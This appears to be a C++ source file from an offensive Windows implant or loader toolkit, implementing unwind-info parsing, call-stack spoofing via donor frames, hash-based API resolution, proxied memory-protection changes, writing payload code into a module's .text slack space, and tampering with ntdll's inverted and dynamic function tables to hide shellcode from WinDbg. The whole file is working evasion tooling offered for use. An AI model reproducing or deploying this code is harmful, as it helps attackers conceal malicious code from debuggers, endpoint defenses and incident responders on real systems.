/* Unwind.cpp */
#include <Windows.h>
#include "Structs.h"
#include "Primitives.h"
#include "Debug.h"
#include "Common.h"

/*================================================
@ CalculateUnwindFrameSize Function
# Parses UNWIND_INFO opcodes to compute total
# stack frame size. Handles all opcode variants
# including multi-slot ALLOC_LARGE and recursive
# chained unwind info descent
================================================*/
DWORD Unwinder::CalculateUnwindFrameSize(
    _In_ PVOID pModule,
    _In_ PVOID pUnwindInfo,
    OUT PDWORD pdwTarget
) {
    PUNWIND_INFO                            UnwindInfo              = (PUNWIND_INFO)pUnwindInfo;
    PUNWIND_CODE                            UnwindCode              = (PUNWIND_CODE)UnwindInfo->UnwindCode;
    DWORD                                   FrameSize               = 0;
    DWORD                                   Node                    = 0;
    BYTE                                    OpInfo                  = 0;

    *pdwTarget = 0;

    while (Node < UnwindInfo->CountOfCodes) {

        switch (UnwindCode->UnwindOp) {

            case UWOP_PUSH_NONVOL: {
                /* Each non-volatile register push decrements RSP by 8 */
                *pdwTarget += sizeof(PVOID);
                FrameSize += sizeof(PVOID);
                break;
            }

            case UWOP_ALLOC_LARGE: {
                /* Two variants: OpInfo = 0 and OpInfo = 1 */
                OpInfo = UnwindCode->OpInfo;

                /* First slot read (the opcode itself) 
                   now advance to the next slot because the size is there
                */
                UnwindCode = (PUNWIND_CODE)((PWORD)UnwindCode + 1); /* PWORD = 2 bytes, One slot = 2 bytes */
                Node++;

                if (OpInfo == 0) {
                    /* FrameOffset * 8 = allocation byte count */
                    FrameSize += (DWORD)UnwindCode->FrameOffset * 8;
                } else {
                    /* Build a 32-bit number from two consecutive FrameOffset values
                       slot N+1 = low 16 bits, slot N+2 = high 16 bits
                    */
                    DWORD Low = UnwindCode->FrameOffset;
                    UnwindCode = (PUNWIND_CODE)((PWORD)UnwindCode + 1);
                    Node++;
                    FrameSize += Low | ((DWORD)UnwindCode->FrameOffset << 16);
                }

                *pdwTarget += FrameSize;
                break;
            }

            case UWOP_ALLOC_SMALL: {
                /* (OpInfo + 1) * 8 = Allocation size */
                *pdwTarget += sizeof(PVOID) * (UnwindCode->OpInfo + 1);
                FrameSize += sizeof(PVOID) * (UnwindCode->OpInfo + 1);
                break;
            }

            case UWOP_SET_FPREG:
                /* lea rbp, [rsp + x] frame pointer setup
                   RSP unchanged, just skip
                */
                break;

            case UWOP_SAVE_NONVOL: {
                /* Register saved via MOV, not push - 1 extra slot for the offset value
                   RSP unchanged, just skip
                */
                UnwindCode = (PUNWIND_CODE)((PWORD)UnwindCode + 1);
                Node++;
                break;
            }

            case UWOP_SAVE_NONVOL_BIG: {
                /* Same thing but with 32-bit offset -> 2 extra slots */
                UnwindCode = (PUNWIND_CODE)((PWORD)UnwindCode + 2);
                Node += 2;
                break;
            }

            case UWOP_EPILOG: /* 6 */
            case UWOP_SAVE_XMM128: {
                /* XMM register save - 1 extra slot, RSP unchanged */
                UnwindCode = (PUNWIND_CODE)((PWORD)UnwindCode + 1);
                Node++;
                break;
            }

            case UWOP_SPARE_CODE: /* 7 */
            case UWOP_SAVE_XMM128BIG: {
                /* XMM register save with 32-bit offset -> 2 extra slots */
                UnwindCode = (PUNWIND_CODE)((PWORD)UnwindCode + 2);
                Node += 2;
                break;
            }

            case UWOP_PUSH_MACH_FRAME: {
                /* Hardware interrupt frame - 0x40 or 0x48 bytes */
                if (UnwindCode->OpInfo == 0) {
                    *pdwTarget += 0x40;
                    FrameSize += 0x40;
                } else {
                    *pdwTarget += 0x48;
                    FrameSize += 0x48;
                }
                break;
            }
        }

        /* Advance to next opcode */
        UnwindCode = (PUNWIND_CODE)((PWORD)UnwindCode + 1);
        Node++;
    }

    /* If UNW_FLAG_CHAININFO is set, another RUNTIME_FUNCTION
       pointer follows the UnwindCode array
       in that case, recursively parse that entry too
    */
    if (BitChainInfo(UnwindInfo->Flags)) {
        
        if (!pModule)
            return FrameSize;
        
        Node = UnwindInfo->CountOfCodes;
        if (Node & 1) Node++; /* Align to even */
        
        PRUNTIME_FUNCTION RtFunc = (PRUNTIME_FUNCTION)(&UnwindInfo->UnwindCode[Node]);
        return CalculateUnwindFrameSize(pModule, (PVOID)((ULONG_PTR)pModule + RtFunc->UnwindData), pdwTarget);
    }

    return FrameSize;
}

/*================================================
@ FindDonorByFrameSize Function
# Scans .pdata to find a donor function with a
# compatible frame size. Filters for UHANDLER
# flag and enforces x64 ABI stack alignment
# (difference % 16 == 8)
================================================*/
PRUNTIME_FUNCTION Unwinder::FindDonorByFrameSize(
    _In_ PVOID pModule,
    _In_ DWORD dwFrameSize,
    _In_ BOOL bStrict,
    OUT PDWORD pdwActual
) {
    DWORD                           Size            = 0;
    PRUNTIME_FUNCTION               RtTable         = (PRUNTIME_FUNCTION)Resolver::ResolveExceptionDirectory(pModule, &Size);
    DWORD                           Count           = Size / sizeof(RUNTIME_FUNCTION);

    if (!RtTable)
        return nullptr;

    for (int i = 0; i < Count; i++) {

        DWORD UnwindRVA = RtTable[i].UnwindData;
        if (!UnwindRVA || (UnwindRVA & 0x1))
            continue;

        PUNWIND_INFO UnwindInfo = (PUNWIND_INFO)((PBYTE)pModule + UnwindRVA);

        /* Skip entries without UNW_FLAG_UHANDLER
           Reason -> functions with handlers have more complete UNWIND_INFO
        */
        if (!(UnwindInfo->Flags & UNW_FLAG_UHANDLER))
            continue;

        DWORD                               Pointless                   = 0;
        DWORD                               Actual                      = Unwinder::CalculateUnwindFrameSize(pModule, UnwindInfo, &Pointless);

        if (bStrict && Actual == dwFrameSize) {
            if (pdwActual)
                *pdwActual = 0;
            return &RtTable[i];
        }

        else if (!bStrict && Actual >= (dwFrameSize + 0x28) && Actual <= (dwFrameSize + 0x500)) {

            DWORD Difference = Actual - dwFrameSize;
            if ((Difference % 16) == 8) {
                if (pdwActual)
                    *pdwActual = Difference;
                return &RtTable[i];
            }
        }
    }

#ifdef DEBUG
    DBGPRINT("[-] No Donor Found For Frame Size 0x%lx \n", dwFrameSize);
#endif
    return nullptr;
}

/*================================================
@ UnlockPDataSection Function
# Sets .pdata memory protection to PAGE_READWRITE
# via proxied NtProtectVirtualMemory. Required
# before any .pdata manipulation
================================================*/
NTSTATUS Unwinder::UnlockPDataSection(
    _In_ PVOID pModule
) {
    SECTION_INFO                    SectionInfo             = { 0 };
    DWORD                           OldProtect              = 0;

    Resolver::ResolvePDataSectionInfo(pModule, &SectionInfo);

    PVOID                           BaseAddress             = SectionInfo.VirtualAddress;
    SIZE_T                          RegionSize              = SectionInfo.VirtualSize;

    return Proxy::WorkItemNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_READWRITE, &OldProtect);
}

/*================================================
@ LockPDataSection Function
# Restores .pdata memory protection to
# PAGE_READONLY via proxied NtProtectVirtualMemory
================================================*/
NTSTATUS Unwinder::LockPDataSection(
    _In_ PVOID pModule
) {
    SECTION_INFO                    SectionInfo             = { 0 };
    DWORD                           OldProtect              = 0;

    Resolver::ResolvePDataSectionInfo(pModule, &SectionInfo);

    PVOID                           BaseAddress             = SectionInfo.VirtualAddress;
    SIZE_T                          RegionSize              = SectionInfo.VirtualSize;

    return Proxy::WorkItemNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_READONLY, &OldProtect);
}

/*================================================
@ UnlockTextSection Function
# Sets .text memory protection to PAGE_EXECUTE_READWRITE
# via proxied NtProtectVirtualMemory.
================================================*/
NTSTATUS Unwinder::UnlockTextSection(
    _In_ PVOID pModule
) {
    SECTION_INFO                    SectionInfo             = { 0 };
    DWORD                           OldProtect              = 0;

    Resolver::ResolveTextSectionInfo(pModule, &SectionInfo);

    PVOID                           BaseAddress             = SectionInfo.VirtualAddress;
    SIZE_T                          RegionSize              = SectionInfo.VirtualSize;

    return Proxy::WorkItemNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_EXECUTE_READWRITE, &OldProtect);
}

/*================================================
@ LockTextSection Function
# Restores .text memory protection to
# PAGE_EXECUTE_READ via proxied NtProtectVirtualMemory
================================================*/
NTSTATUS Unwinder::LockTextSection(
    _In_ PVOID pModule
) {
    SECTION_INFO                    SectionInfo             = { 0 };
    DWORD                           OldProtect              = 0;

    Resolver::ResolveTextSectionInfo(pModule, &SectionInfo);

    PVOID                           BaseAddress             = SectionInfo.VirtualAddress;
    SIZE_T                          RegionSize              = SectionInfo.VirtualSize;

    return Proxy::WorkItemNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_EXECUTE_READ, &OldProtect);
}

/*================================================
@ ResolveDynamicFunctionTablePtrs Function
# Locates the _DYNAMIC_FUNCTION_TABLE linked list
# head pointer and sentinel by pattern scanning
# RtlAddFunctionTable's machine code for the
# MOV/LEA/CMP triple instruction sequence
================================================*/
BOOL Unwinder::ResolveDynamicFunctionTablePtrs(
    _In_ HANDLE hProcess,
    OUT PULONG_PTR puHeadPtr,
    OUT PULONG_PTR puSentinel
) {
    /* Get Ntdll Info */
    PVOID                               Ntdll               = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll"));
    ULONG_PTR                           NtdllBase           = (ULONG_PTR)Ntdll;
    auto                                Nt                  = (PIMAGE_NT_HEADERS)(NtdllBase + ((PIMAGE_DOS_HEADER)NtdllBase)->e_lfanew);
    SIZE_T                              NtdllSize           = Nt->OptionalHeader.SizeOfImage;

    /* Find RtlAddFunctionTable's address */
    ULONG_PTR FnAddress = (ULONG_PTR)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlAddFunctionTable"));
    if (!FnAddress)
        return FALSE;

    /* Read the function's machine code */
    BYTE Buffer[1024] = { 0 };
    Primitive::MemoryCopy(Buffer, (PVOID)FnAddress, sizeof(Buffer));

    /* Helper lambdas */
    /* InNtdll: checks if an address falls within ntdll's address range
       prevents false positives - a random RIP-relative reference
       pointing outside ntdll is invalid
    */
    auto InNtdll = [&](ULONG_PTR uAddress) {
        return uAddress > NtdllBase && uAddress < NtdllBase + NtdllSize;
    };

    /* RipRel: resolves RIP-relative addressing 
       x64 MOV/LEA [RIP+offset] pattern works as follows:
       instruction address + instruction length + rel32 = target address
    */
    auto RipRel = [&](int i, int Off, int Len) -> ULONG_PTR {
        INT32 Rel = 0;
        Primitive::MemoryCopy(&Rel, &Buffer[i + Off], sizeof(INT32));
        return FnAddress + i + Len + Rel;
    };

    /*
       Pattern Search: RtlAddFunctionTable inserts a new entry into the linked list
       to do this it must load the head pointer and sentinel

       Pattern We're looking for:
       48 8B 05 [rel32] -> MOV RAX, [RIP + offset] (Load Head Pointer)
       48 8D 0D [rel32] -> LEA RCX, [RIP + offset] (Load Sentinel Address)
       48 39 08         -> CMP [RAX], RCX (Check If List Is Empty)
    */
    for (int i = 0; i < 1004; i++) {

        /* Find MOV RAX, [RIP+OFFSET] 
           48 = REX.W prefix (64-bit operand)
           8B = MOV opcode
           05 = ModR/M: [RIP+disp32] -> RAX
        */
        if (Buffer[i] != 0x48 || Buffer[i + 1] != 0x8B || Buffer[i + 2] != 0x05)
            continue;

        ULONG_PTR HeadPtr = RipRel(i, 3, 7); /* Offset starts at byte 3, Instruction is 7 bytes long */
        if (!(InNtdll(HeadPtr)))
            continue; /* If Head pointer is outside ntdll, this is a false match */
       

        /* Find LEA RCX, [RIP + offset] */
        for (int j = i + 7; j < i + 48 && j < 1014; j++) {

            if (Buffer[j] != 0x48 || Buffer[j + 1] != 0x8D)
                continue;

            if ((Buffer[j + 2] & 0xC7) != 0x05)
                continue;

            ULONG_PTR Sentinel = RipRel(j, 3, 7);
            if (!(InNtdll(Sentinel)))
                continue;

            /* Find CMP [RAX], RCX */
            for (int k = j + 7; k < j + 16 && k < 1021; k++) {

                if (Buffer[k] == 0x48 && Buffer[k + 1] == 0x39 && Buffer[k + 2] == 0x08) {
                    /* Triple pattern matched -> head and sentinel found*/
                    *puHeadPtr      = HeadPtr;
                    *puSentinel     = Sentinel;
#ifdef DEBUG
                    DBGPRINT("[*] Triple Pattern Matched \n");
                    DBGPRINT("[i] \tHead Pointer -> %Ix \n", HeadPtr);
                    DBGPRINT("[i] \tSentinel -> %Ix \n", Sentinel);
#endif
                    return TRUE;
                }
            }
        }
    }

#ifdef DEBUG
    DBGPRINT("[-] Could Not Find Head And Sentinel Pointer - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
    return FALSE;
}

/*================================================
@ LocateDynamicFunctionTableEntry Function
# Walks the _DYNAMIC_FUNCTION_TABLE linked list
# to find the entry whose address range covers
# the shellcode. Used to modify the Type field
# for WinDbg bypass (Type = 0 trick)
================================================*/
PDYNAMIC_FUNCTION_TABLE Unwinder::LocateDynamicFunctionTableEntry(
    _In_ ULONG_PTR uAddress
) {
    ULONG_PTR               HeadPtr             = 0;
    ULONG_PTR               Sentinel            = 0;
    if (!Unwinder::ResolveDynamicFunctionTablePtrs(NtCurrentProcess(), &HeadPtr, &Sentinel)) {
        return nullptr;
    }

    /* Head Pointer -> Address of the first entry
       Sentinel -> End of the list (circular list guard)
    */
    ULONG_PTR       Current     = *(PULONG_PTR)HeadPtr;
    INT             i           = 0;

    while (Current != Sentinel) {

        PDYNAMIC_FUNCTION_TABLE DynamicEntry = (PDYNAMIC_FUNCTION_TABLE)Current;

        /* MinimumAddress <= Address < MaximumAddress -> this entry covers our shellcode */
        if (uAddress >= DynamicEntry->MinimumAddress && uAddress < DynamicEntry->MaximumAddress)
            return DynamicEntry;

        /* Move to the next entry in the linked list */
        Current = (ULONG_PTR)DynamicEntry->Links.Flink;
        if (++i > 1000)
            break;
    }

    return nullptr;
}

/*================================================
@ LocateInvertedFunctionTable Function
# Finds _INVERTED_FUNCTION_TABLE address and its
# SRW lock by chaining through RtlLookupFunction
# Entry -> RtlpxLookupFunctionTable, collecting
# RIP-relative references, and identifying the
# lock via RtlAcquireSRWLockShared call proximity
================================================*/
BOOL Unwinder::LocateInvertedFunctionTable(
    OUT PINVERTED_FUNCTION_TABLE* ppInvertedTable,
    OUT PRTL_SRWLOCK* ppSrwLock
) {
    PVOID                               Ntdll               = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll"));
    ULONG_PTR                           NtdllBase           = (ULONG_PTR)Ntdll;
    auto                                Nt                  = (PIMAGE_NT_HEADERS)(NtdllBase + ((PIMAGE_DOS_HEADER)NtdllBase)->e_lfanew);
    SIZE_T                              NtdllSize           = Nt->OptionalHeader.SizeOfImage;

    auto InNtdll = [&](ULONG_PTR A) {
        return A > NtdllBase && A < NtdllBase + NtdllSize;
    };

    auto RipRel = [&](const BYTE* B, int i, int Off, int Len, ULONG_PTR Base) -> ULONG_PTR {
        INT32 Rel = 0;
        Primitive::MemoryCopy(&Rel, (PVOID)&B[i + Off], sizeof(INT32));
        return Base + i + Len + Rel;
    };

    /* Step 1: Try KiUserInvertedFunctionTable export 
       Some Windows builds export this table directly
       fastest path - if found, no pattern scan needed
    */
    ULONG_PTR TableAddress = (ULONG_PTR)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("KiUserInvertedFunctionTable"));

    /* Step 2: Read RtlLookupFunctionEntry's machine code 
       This function is called during stack walks
       internally it calls RtlpxLookupFunctionTable
       we find that CALL to learn the inner function's address
    */
    ULONG_PTR FnAddress = (ULONG_PTR)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlLookupFunctionEntry"));
    if (!FnAddress)
        return FALSE;

    BYTE Buffer[1024] = { 0 };
    Primitive::MemoryCopy(Buffer, (PVOID)FnAddress, sizeof(Buffer));

    /* Step 3: Find RtlpxLookupFunctionTable 
       looking for the first E8 (CALL rel32) in RtlLookupFunctionEntry
       this CALL most likely targets RtlpxLookupFunctionTable
    */
    ULONG_PTR RtlpxAddress = 0;
    for (int i = 0; i < 1019; i++) {
        
        if (Buffer[i] != 0xE8)
            continue;

        INT32 Rel = 0;
        Primitive::MemoryCopy(&Rel, &Buffer[i + 1], 4);
        ULONG_PTR Target = FnAddress + i + 5 + Rel;

        if (InNtdll(Target)) {
            RtlpxAddress = Target;
            break;
        }
    }

    if (!RtlpxAddress)
        return FALSE;

    /* Step 4: Read RtlpxLookupFunctionTable machine code */
    BYTE Buffer2[1024] = { 0 };
    Primitive::MemoryCopy(Buffer2, (PVOID)RtlpxAddress, sizeof(Buffer2));

    /* Step 5: Collect all RIP-relative references 
       Inside RtlpxLookupFunctionTable:
       LEA Rxx, [RIP+offset] -> Loads address of a global variable
       MOV Rxx, [RIP+offset] -> Loads a global pointer
       one of these references is _INVERTED_FUNCTION_TABLE
       another is the SRW lock
       we don't know which is which yet - we'll distinguish in later steps
    */
    struct RipRef {int Offset; BYTE Op; ULONG_PTR Target; };
    RipRef Refs[64] = { 0 };
    INT nRefs = 0;

    for (int i = 0; i < 1017 && nRefs < 64; i++) {

        /* REX prefix: 0x48 (W) or 0x4C (WR) */
        if (Buffer2[i] != 0x48 && Buffer2[i] != 0x4C)
            continue;

        /* 0x8B = MOV, 0x8D = LEA */
        if (Buffer2[i + 1] != 0x8B && Buffer2[i + 1] != 0x8D)
            continue;

        if ((Buffer2[i + 2] & 0xC7) != 0x05)
            continue;

        ULONG_PTR Target = RipRel(Buffer2, i, 3, 7, RtlpxAddress);
        if (!InNtdll(Target))
            continue;

        Refs[nRefs++] = {i, Buffer2[i + 1], Target };
    }

    /* Step 6: Find the SRW lock 
       RtlpxLookupFunctionTable acquires a lock before reading the table:
       LEA RCX, [RIP+offset] <- Load lock address
       CALL RtlAcquireSRWLockShared <- Acquire lock
    */
    ULONG_PTR LockAddress = 0;
    ULONG_PTR AcquireShared = (ULONG_PTR)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlAcquireSRWLockShared"));

    for (int i = 5; i < 1019; i++) {

        if (Buffer2[i] != 0xE8)
            continue;

        INT32 Rel = 0;
        Primitive::MemoryCopy(&Rel, &Buffer2[i + 1], 4);
        ULONG_PTR CallTarget = RtlpxAddress + i + 5 + Rel;

        /* Is this CALL targeting RtlAcquireSRWLockShared ? */
        if (CallTarget != AcquireShared)
            continue;

        /* Yes -> there's a LEA just before it 
           Scan bbackwards up to 16 bytes
        */
        for (int j = i - 1; j >= (i - 16 > 0 ? i - 16 : 0); j--) {

            if (Buffer2[j] != 0x48 && Buffer2[j] != 0x4C)
                continue;
            if (Buffer2[j + 1] != 0x8D)
                continue;
            if ((Buffer2[j + 2] & 0xC7) != 0x05)
                continue;

            ULONG_PTR Candidate = RipRel(Buffer2, j, 3, 7, RtlpxAddress);
            if (InNtdll(Candidate)) {
                LockAddress = Candidate;
                break;
            }
        }

        if (LockAddress)
            break;
    }

    /* Step 7: determine table address (if export was not found) 
       Find the LEA reference that is NOT the lock
       that reference is the _INVERTED_FUNCTION_TABLE address
       Validation: the first DWORD at the referenced location
       is the table's Count field - should be a reasonable value (0-512)
    */
    if (!TableAddress) {

        for (int i = 0; i < nRefs; i++) {

            if (Refs[i].Op != 0x8D)
                continue;

            if (Refs[i].Target == LockAddress)
                continue;

            ULONG_PTR TblCandidate = *(PULONG_PTR)Refs[i].Target;
            if (!TblCandidate)
                continue;

            /* Count field sanity check */
            ULONG Count = *(ULONG*)TblCandidate;
            if (Count == 0 || Count > 512)
                continue;

            TableAddress = TblCandidate;
            break;
        }
    }

    if (!LockAddress || !TableAddress)
        return FALSE;

#ifdef DEBUG
    DBGPRINT("[+] Inverted Function Table -> 0x%p \n", (PVOID)TableAddress);
    DBGPRINT("[+] SRW Lock -> 0x%p \n", (PVOID)LockAddress);
#endif

    *ppInvertedTable        = (PINVERTED_FUNCTION_TABLE)TableAddress;
    *ppSrwLock              = (PRTL_SRWLOCK)LockAddress;
    
    return TRUE;
}

/*================================================
@ ResolveLdrMrdataProtector Function
# Locates the unexported LdrProtectMrdata function
# by scanning RtlAddFunctionTable for the byte
# pattern 33 C9 48 89 43 28 E8 and resolving
# the CALL target via rel32 offset
================================================*/
BOOL Unwinder::ResolveLdrMrdataProtector(
    OUT fnLdrProtectMrdata* pOutFnPtr
) {
    PVOID                   Ntdll           = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll"));
    ULONG_PTR               FnAddress       = (ULONG_PTR)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlAddFunctionTable"));

    BYTE Buffer[512] = { 0 };
    Primitive::MemoryCopy(Buffer, (PVOID)FnAddress, sizeof(Buffer));

    /* Pattern: 33 C9 48 89 43 28 E8
       XOR ECX, ECX | MOV [RBX+28H], RAX | CALL LdrProtectMrdata
    */
    const BYTE Pattern[] = { 0x33, 0xC9, 0x48, 0x89, 0x43, 0x28, 0xE8 };

    for (int i = 0; i < (int)(sizeof(Buffer) - sizeof(Pattern)); i++) {

        if (Primitive::MemoryCompare(&Buffer[i], Pattern, sizeof(Pattern)) != 0)
            continue;

        INT32 Rel = 0;
        Primitive::MemoryCopy(&Rel, &Buffer[i + 7], sizeof(INT32));
        ULONG_PTR Candidate = FnAddress + i + 7 + 4 + Rel;

        if (Candidate > (ULONG_PTR)Ntdll && Candidate < (ULONG_PTR)Ntdll + 0x200000) {
            *pOutFnPtr = (fnLdrProtectMrdata)Candidate;
#ifdef DEBUG
            DBGPRINT("[+] LdrProtectMrdata Resolved -> 0x%p \n", (PVOID)Candidate);
#endif
            return TRUE;
        }
    }

#ifdef DEBUG
    DBGPRINT("[-] LdrProtectMrdata Not Found - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
    return FALSE;
}

/*================================================
@ CollapseInvertedTableEntry Function
# Sets ImageSize to 0 in _INVERTED_FUNCTION_TABLE
# for the target module. Acquires exclusive SRW
# lock and unprotects .mrdata before writing.
# This hides the shellcode from WinDbg lookups
================================================*/
BOOL Unwinder::CollapseInvertedTableEntry(
    _In_ PVOID pModule,
    OUT PULONG puOldSize
) {
    PINVERTED_FUNCTION_TABLE                    InvertedTable               = nullptr;
    PRTL_SRWLOCK                                SrwLock                     = nullptr;
    PVOID                                       Ntdll                       = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll"));

    auto Acquire = (fnRtlAcquireSRWLockExclusive)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlAcquireSRWLockExclusive"));
    auto Release = (fnRtlReleaseSRWLockExclusive)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlReleaseSRWLockExclusive"));

    fnLdrProtectMrdata LdrProtectMrData = nullptr;
    Unwinder::ResolveLdrMrdataProtector(&LdrProtectMrData);
    if (!LdrProtectMrData)
        return FALSE;

    if (!Unwinder::LocateInvertedFunctionTable(&InvertedTable, &SrwLock))
        return FALSE;

    if (!InvertedTable || !SrwLock)
        return FALSE;

    Acquire(SrwLock);
    LdrProtectMrData(FALSE);

    BOOL Found = FALSE;
    for (int i = 0; i < InvertedTable->Count; i++) {

        if (InvertedTable->Entries[i].ImageBase != pModule)
            continue;

        *puOldSize = InvertedTable->Entries[i].ImageSize;
        InvertedTable->Entries[i].ImageSize = 0;
        Found = TRUE;
        break;
    }

     LdrProtectMrData(TRUE);
     Release(SrwLock);

     return Found;
}

/*================================================
@ LocateTextAppendCursor Function (static)
# Scans .text section backwards from the end to
# find the first usable slack space (0xCC/0x00).
# Returns aligned pointer to the free region
================================================*/
static PUBYTE LocateTextAppendCursor(
    _In_ const SECTION_INFO* pSectionInfo,
    _In_ SIZE_T sAlignment,
    OUT SIZE_T* pSkipped,
    OUT SIZE_T* pAvailable
) {
    if (!pSectionInfo || !pSectionInfo->VirtualAddress || !pSectionInfo->VirtualSize)
        return nullptr;

    PUBYTE                  pBase           = (PUBYTE)pSectionInfo->VirtualAddress;
    SIZE_T                  dwSize          = (pSectionInfo->VirtualSize + 0x1000) & 0xFFFFF000;
    PUBYTE                  p               = pBase + (dwSize - 1);
    SIZE_T                  Skipped         = 0;

    for (;;) {
        if (p < pBase) break;
        UBYTE b = *p;
        if (b != 0xCC && b != 0x00) break;
        --p;
        ++Skipped;
    }

    PUBYTE pFirstFree = (p < pBase) ? pBase : (p + 1);

    if (sAlignment && (sAlignment & (sAlignment - 1)) == 0) {
        ULONG_PTR v = (ULONG_PTR)pFirstFree;
        ULONG_PTR Aligned = (v + (sAlignment - 1)) & ~(ULONG_PTR)(sAlignment - 1);
        if (Aligned < v) return nullptr;
        pFirstFree = (PUBYTE)Aligned;
    }

    if (pFirstFree < pBase || (SIZE_T)(pFirstFree - pBase) > dwSize)
        return nullptr;

    if (pSkipped)   *pSkipped = Skipped;
    if (pAvailable) *pAvailable = (SIZE_T)(pBase + dwSize - pFirstFree);

    return pFirstFree;
}

/*================================================
@ AppendCodeToText Function
# Writes code into .text section slack space.
# Finds cursor via LocateTextAppendCursor, unlocks
# .text, copies payload, re-locks. Returns the
# RVA of the written code via pdwBeginRva
================================================*/
BOOL Unwinder::AppendCodeToText(
    _In_ PVOID pModule,
    _In_ PVOID pCode,
    _In_ DWORD dwCodeSize,
    OUT PDWORD pdwBeginRva
) {
    static DWORD s_dwBytesWritten = 0;

    SECTION_INFO                    SectionInfo             = { 0 };
    SIZE_T                          Skipped                 = 0;
    SIZE_T                          Available               = 0;

    Resolver::ResolveTextSectionInfo(pModule, &SectionInfo);

    PUBYTE pAppendAt = LocateTextAppendCursor(&SectionInfo, 1024, &Skipped, &Available);
    if (!pAppendAt)
        return FALSE;

    pAppendAt += s_dwBytesWritten;
    Available -= s_dwBytesWritten;

    if (Available < dwCodeSize)
        return FALSE;

    *pdwBeginRva = (DWORD)((ULONG_PTR)pAppendAt - (ULONG_PTR)pModule);

    NTSTATUS Status = Unwinder::UnlockTextSection(pModule);
    if (!NT_SUCCESS(Status))
        return FALSE;

    Primitive::MemoryCopy(pAppendAt, pCode, dwCodeSize);

    Unwinder::LockTextSection(pModule);

    s_dwBytesWritten += dwCodeSize;

    return TRUE;
}

/*================================================
@ ResolveFunctionSize Function
# Looks up a function's RUNTIME_FUNCTION entry
# by its RVA and returns EndAddress - BeginAddress
================================================*/
DWORD Unwinder::ResolveFunctionSize(
    _In_ PVOID pModule,
    _In_ PVOID pFunction
) {
    DWORD                           Size            = 0;
    DWORD                           FunctionRva     = (DWORD)((ULONG_PTR)pFunction - (ULONG_PTR)pModule);
    PRUNTIME_FUNCTION               RtTable         = (PRUNTIME_FUNCTION)Resolver::ResolveExceptionDirectory(pModule, &Size);
    DWORD                           Count           = Size / sizeof(RUNTIME_FUNCTION);

    if (!RtTable)
        return 0;

    for (DWORD i = 0; i < Count; i++) {
        if (RtTable[i].BeginAddress == FunctionRva)
            return RtTable[i].EndAddress - RtTable[i].BeginAddress;
    }

#ifdef DEBUG
    DBGPRINT("[-] Function Not Found In .pdata -> RVA: 0x%lx \n", FunctionRva);
#endif
    return 0;
}

/*================================================
@ ExpandInvertedTableEntry Function
# Restores ImageSize to its original value in
# _INVERTED_FUNCTION_TABLE. Called by
# RevertAllSpoofChanges during cleanup to undo
# the CollapseInvertedTableEntry operation
================================================*/
BOOL Unwinder::ExpandInvertedTableEntry(
    _In_ PVOID pModule,
    _In_ ULONG ulOldSize
) {
    PINVERTED_FUNCTION_TABLE                    InvertedTable = nullptr;
    PRTL_SRWLOCK                                SrwLock = nullptr;
    PVOID                                       Ntdll = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll"));

    auto Acquire = (fnRtlAcquireSRWLockExclusive)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlAcquireSRWLockExclusive"));
    auto Release = (fnRtlReleaseSRWLockExclusive)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlReleaseSRWLockExclusive"));

    fnLdrProtectMrdata LdrProtectMrData = nullptr;
    Unwinder::ResolveLdrMrdataProtector(&LdrProtectMrData);
    if (!LdrProtectMrData)
        return FALSE;

    if (!Unwinder::LocateInvertedFunctionTable(&InvertedTable, &SrwLock))
        return FALSE;

    if (!InvertedTable || !SrwLock)
        return FALSE;

    Acquire(SrwLock);
    LdrProtectMrData(FALSE);

    BOOL Found = FALSE;
    for (int i = 0; i < InvertedTable->Count; i++) {

        if (InvertedTable->Entries[i].ImageBase != pModule)
            continue;

        InvertedTable->Entries[i].ImageSize = ulOldSize;
        Found = TRUE;
        break;
    }

    LdrProtectMrData(TRUE);
    Release(SrwLock);

    return Found;
}